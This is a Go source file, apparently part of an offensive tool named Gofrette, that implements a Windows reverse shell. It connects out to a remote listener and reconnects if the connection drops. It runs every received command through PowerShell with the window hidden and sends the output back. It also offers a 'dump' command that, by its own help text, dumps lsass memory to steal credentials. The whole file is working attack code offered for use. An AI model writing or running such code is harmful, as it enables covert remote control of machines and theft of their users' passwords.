package shell

import (
	"bufio"
	"fmt"
	d "github.com/Enelg52/Gofrette/dump"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"syscall"
	"time"
)

func Shell(host string) {
	//Connect to the listener
	c, err := net.Dial("tcp", host)
	if err != nil {
		if c != nil {
			c.Close()
		}
		//Try to reconnect every 5 sec
		time.Sleep(time.Second)
		Shell(host)
	}
	fmt.Println("Connected... :)")

	r := bufio.NewReader(c)
	for {
		//Print path and > on the shell
		path, _ := os.Getwd()
		c.Write([]byte(path))
		c.Write([]byte(">"))

		//Read remote input
		cmd, _ := r.ReadString('\n')
		if nil != err {
			c.Close()
			fmt.Println("Closed... :(")
			return
		}
		//Remove the "\n"
		cmd = strings.TrimSuffix(cmd,"\n")
		args := strings.Split(cmd, " ")
		//Get the home dir
		usr, _:= user.Current()
		//Custom commands
		switch args[0] {
		case "cd":
			//Go to home directory if command is "cd"
			if len(args) == 1 {
				os.Chdir(usr.HomeDir)
			} else {
				os.Chdir(args[1])
			}
		case "exit":
			//Exit terminal
			c.Close();
			os.Exit(0)
		case "dump":
			d.Dump("C:\\temp\\",c)
		case "help":
			c.Write([]byte("exit : exit terminal\ndump : dump lsass in /tmp\n"))
		default:
			cmd := exec.Command("powershell", "/C", cmd)
			//Hide windows
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			//Read and print output
			out, _ := cmd.CombinedOutput()
			c.Write(out)
		}
	}
}